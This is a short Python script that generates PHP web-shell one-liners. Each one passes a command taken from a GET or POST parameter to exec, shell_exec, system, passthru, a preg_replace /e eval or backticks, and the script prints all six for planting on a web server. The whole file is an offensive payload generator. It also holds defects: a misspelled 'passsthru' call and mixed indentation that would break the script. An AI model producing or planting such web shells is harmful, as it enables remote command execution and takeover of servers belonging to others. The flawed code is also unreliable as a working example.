#!/usr/bin/python
import sys

def php(shell):
    a = '<?php exec('+shell+',$array);print_r($array);?>'
    b = '<?php echo shell_exec('+shell+');?>'
    c = '<?php system('+shell+');?>'
    d = '<?php passsthru('+shell+');?>'
    e = "<?php preg_replace('/.*/e','system("+shell+");','');?>"
    f = '<?php echo `'+shell+'`;?>'
    return [a,b,c,d,e,f]

def help():
	print("[!] usage:")
  print("python "+sys.argv[0])
  print("python "+sys.argv[0]+" <METHOD> <PASSWD>")

# usage
if len(sys.argv) == 3:
	method = sys.argv[1].upper()
	if not method in ("GET","POST"):
		help()
		sys.exit(1)
	passwd = sys.argv[2]
elif len(sys.argv) == 1:
	method = "GET"
	passwd = "cmd"
else:
    help()
    sys.exit(1)

# Printermethod
shell = '$_'+method+'["'+passwd+'"]'
for line in php(shell):
    print("[\033[1;34m*\033[0m] "+line)
